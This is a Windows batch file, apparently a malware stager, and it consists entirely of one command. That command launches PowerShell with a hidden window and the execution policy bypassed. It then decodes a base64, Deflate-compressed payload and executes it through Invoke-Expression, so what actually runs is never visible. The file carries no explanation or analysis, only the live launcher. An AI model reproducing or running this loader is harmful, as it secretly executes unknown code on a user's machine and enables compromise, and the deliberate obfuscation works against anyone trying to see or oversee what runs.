@echo off
if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtb9pIEP7OrxhZe5KtYMcELpdgRSqF5pq7QnMhTXqH0GmxB7xlveus17yE8t9vTFySfj0JeZnx7DzPzDxj9gRX8M5pTAZS3mS5NtZ1lmgUyvZZkEjpeFPIy5kUMRSWWzpwY+k93Ch7aw08CGNLLntS6titfTLvJYnBomhCKZSFZD0Wz1gb85dYSqXV/TZ/dd8abTG2XvS/ufQNcov3KR3JK5cXu2etEbPS4htSlsfLF2bHYPIZe2R/dN9ywzMkrOPlAxaVcC354m3kC9pNQmU47xrWbHcsoQ47vff9wYfr3z/e/PHnp+Ho8+1fd+P7Lw+PX//+h8/iBOeLVHxbykzp/MkUtlytN9vnsHXW7vx6/tvFpRPc637KTc8YvnW9xrxUcYUOsctW3g4M2pL64LoTYjeZToGtfr4B32GIvCgN+p9n36jN4I/LzAvoAb9AuGmFIfj4BJdn3v41u4Udm1fsnagVBO3vc03FxamvDyno3ckVsGTiLtD6hqtEZ+BnfCMyysqS4BOqhU296T6q+bF59CY7wg5yo2NqNewmvCI6ZRuCo8cJsH/3EaBKiMKG2BekhhoXdq7C9Q/j7oDrBYq04Hr7/RuAxQ6IMbhMXIURE+BLC+cd+ndy4u1YSkg2YssKMCEEjADqAumKBEF8lxRXVAFpxUhGIObgUs8Lz4Nj1ymCYGvDuVx9/eJQmZMR2mCMZiVivNU0liFXfIFm2u1WXjR9NFbMBW0CPnApkoOc+lzKGcmSMHfMmhL3EcvIGFHB9eDG28JiFlTpH3HWlwKVjRosCz6S8NAUAcnXdcoCjU94yjpNcIb6WUjJTztBSPx1lhPYTFLFw/HNBzgPWhE8CurjuoDRved4EVMEuohg8n5r8SCovGpDFgz0WknNkwG33HVSa/Oie3raCoMfv+5Fp9M+ZcoBr8E0XSI6frXoJA3MZmgGOBdKHAbEnsAf0WKBQ+jtMwd8RVaR8xjh4LmuR1mAn/OisKkpG2xzxXS3+9OHJ2yyvJZbM9y0wzCkoxN60aTu1l2prMgwoD1Fo/N6LkUw5KZIuaSh9HW+dVnehLAJk5d1nrpsQ2tERvvM9bwmHEGq0ujK2+8NITbZplkdYbVuurS+KiVp5vBN8ccSMaetw1iTqC/OO2G4p9nH6W7/Hw==\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtb9pIEP7OrxhZe5KtYMcELpdgRSqF5pq7QnMhTXqH0GmxB7xlveus17yE8t9vTFySfj0JeZnx7DzPzDxj9gRX8M5pTAZS3mS5NtZ1lmgUyvZZkEjpeFPIy5kUMRSWWzpwY+k93Ch7aw08CGNLLntS6titfTLvJYnBomhCKZSFZD0Wz1gb85dYSqXV/TZ/dd8abTG2XvS/ufQNcov3KR3JK5cXu2etEbPS4htSlsfLF2bHYPIZe2R/dN9ywzMkrOPlAxaVcC354m3kC9pNQmU47xrWbHcsoQ47vff9wYfr3z/e/PHnp+Ho8+1fd+P7Lw+PX//+h8/iBOeLVHxbykzp/MkUtlytN9vnsHXW7vx6/tvFpRPc637KTc8YvnW9xrxUcYUOsctW3g4M2pL64LoTYjeZToGtfr4B32GIvCgN+p9n36jN4I/LzAvoAb9AuGmFIfj4BJdn3v41u4Udm1fsnagVBO3vc03FxamvDyno3ckVsGTiLtD6hqtEZ+BnfCMyysqS4BOqhU296T6q+bF59CY7wg5yo2NqNewmvCI6ZRuCo8cJsH/3EaBKiMKG2BekhhoXdq7C9Q/j7oDrBYq04Hr7/RuAxQ6IMbhMXIURE+BLC+cd+ndy4u1YSkg2YssKMCEEjADqAumKBEF8lxRXVAFpxUhGIObgUs8Lz4Nj1ymCYGvDuVx9/eJQmZMR2mCMZiVivNU0liFXfIFm2u1WXjR9NFbMBW0CPnApkoOc+lzKGcmSMHfMmhL3EcvIGFHB9eDG28JiFlTpH3HWlwKVjRosCz6S8NAUAcnXdcoCjU94yjpNcIb6WUjJTztBSPx1lhPYTFLFw/HNBzgPWhE8CurjuoDRved4EVMEuohg8n5r8SCovGpDFgz0WknNkwG33HVSa/Oie3raCoMfv+5Fp9M+ZcoBr8E0XSI6frXoJA3MZmgGOBdKHAbEnsAf0WKBQ+jtMwd8RVaR8xjh4LmuR1mAn/OisKkpG2xzxXS3+9OHJ2yyvJZbM9y0wzCkoxN60aTu1l2prMgwoD1Fo/N6LkUw5KZIuaSh9HW+dVnehLAJk5d1nrpsQ2tERvvM9bwmHEGq0ujK2+8NITbZplkdYbVuurS+KiVp5vBN8ccSMaetw1iTqC/OO2G4p9nH6W7/Hw==\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") 